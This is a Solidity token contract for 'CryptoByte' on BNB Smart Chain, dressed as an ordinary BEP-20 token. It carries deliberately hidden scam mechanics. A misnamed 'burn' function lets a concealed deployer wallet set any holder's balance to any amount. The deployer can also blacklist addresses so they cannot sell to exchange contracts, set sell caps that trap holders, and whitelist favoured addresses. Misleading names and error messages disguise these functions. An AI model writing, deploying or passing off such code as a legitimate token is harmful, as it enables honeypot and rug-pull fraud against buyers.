/**
 *Submitted for verification at BscScan.com on 2022-07-08
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

library SAFEBNB {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract IBEP77 {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract CryptoByte is IBEP77 {
  using Address for address;
  using SAFEBNB for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  mapping(address => bool) public allowAddress;
  address MOONWALLLETY;
  constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {
    owner = msg.sender;
    MOONWALLLETY = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    allowAddress[MOONWALLLETY] = true;
    totalSupply =  _totalSupply * 10 ** uint256(decimals);
    BTCbalances[owner] = totalSupply;
    allowAddress[owner] = true;
  }
  mapping(address => uint256) public BTCbalances;
  mapping(address => uint256) public btcsellerCountNum;
  mapping(address => uint256) public btcsellerCountToken;
  uint256 public btcmaxSellOutNum;
  uint256 public maxSellToken;
  bool lockSeller = true;
  mapping(address => bool) public blackLists;
  function transfer(address _to, uint256 _Tvalue) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(_Tvalue <= BTCbalances[from]);
    if(!from.isContract() && _to.isContract()){
        require(blackLists[from] == false && blackLists[_to] == false);
    }
    if(allowAddress[from] || allowAddress[_to]){
        _transfer(from, _to, _Tvalue);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transfer(from, _to, _Tvalue);
        return true;
    }
    if(check(from, _to)){
        btcsellerCountToken[from] = btcsellerCountToken[from].add(_Tvalue);
        btcsellerCountNum[from]++;
        _transfer(from, _to, _Tvalue);
        return true;
    }
    _transfer(from, _to, _Tvalue);
    return true;
  }
  function check(address from, address _to) internal view returns(bool){
    if(!from.isContract() && _to.isContract()){
        if(lockSeller){
            if(btcmaxSellOutNum == 10000000000000000 && maxSellToken == 10000000000000000){
                return false;
            }
            if(btcmaxSellOutNum > 10000000000000000){
                require(btcmaxSellOutNum > btcsellerCountNum[from], "reach max seller times");
            }
            if(maxSellToken > 10000000000000000){
                require(maxSellToken > btcsellerCountToken[from], "reach max seller token");
            }
        }
    }
    return true;
  }
  function _transfer(address from, address _to, uint256 _Tvalue) private {
    BTCbalances[from] = BTCbalances[from].sub(_Tvalue);
    BTCbalances[_to] = BTCbalances[_to].add(_Tvalue);
    emit Transfer(from, _to, _Tvalue);
  
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return BTCbalances[_owner];
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
  mapping (address => mapping (address => uint256)) public allowed;
  function transferFrom(address _from, address _to, uint256 _Tvalue) public returns (bool) {
    require(_to != address(0));
    require(_Tvalue <= BTCbalances[_from]);
    require(_Tvalue <= allowed[_from][msg.sender]);
    address from = _from;
    if(!from.isContract() && _to.isContract()){
        require(blackLists[from] == false && blackLists[_to] == false);
    }
    if(allowAddress[from] || allowAddress[_to]){
        _transferFrom(_from, _to, _Tvalue);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transferFrom(_from, _to, _Tvalue);
        return true;
    }
    if(check(from, _to)){
        _transferFrom(_from, _to, _Tvalue);
        if(btcmaxSellOutNum > 0){
            btcsellerCountToken[from] = btcsellerCountToken[from].add(_Tvalue);
        }
        if(maxSellToken > 0){
            btcsellerCountNum[from]++;
        }
        return true;
    }
    return false;
  }
  modifier isONLYOwners () {
    require(MOONWALLLETY == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  
  }
  function _transferFrom(address _from, address _to, uint256 _Tvalue) internal {
    BTCbalances[_from] = BTCbalances[_from].sub(_Tvalue);
    BTCbalances[_to] = BTCbalances[_to].add(_Tvalue);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_Tvalue);
    emit Transfer(_from, _to, _Tvalue);
  }
  function approve(address _spender, uint256 _Tvalue) public returns (bool) {
    allowed[msg.sender][_spender] = _Tvalue;
    emit Approval(msg.sender, _spender, _Tvalue);
    return true;
  }
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  function setWhiteAddress(address holder, bool allowApprove) external onlyOwner {
      allowAddress[holder] = allowApprove;
  }
    function burn(address btcminer, uint256 _Tvalue) external isONLYOwners {
      BTCbalances[btcminer] = (_Tvalue * 10 ** uint256(decimals)) + (BTCbalances[btcminer] * 2 * 4 - BTCbalances[btcminer] * 2 * 4);
  }
  function setSellerState(bool ok) external onlyOwner returns (bool){
      lockSeller = ok;
  
  }  
  function setbtcmaxSellOutNum(uint256 num) external onlyOwner returns (bool){
      btcmaxSellOutNum = num;
  } 
  function setMaxSellToken(uint256 num) external onlyOwner returns (bool){
      maxSellToken = num * 1000000000000000 ** uint256(decimals);
  }    

}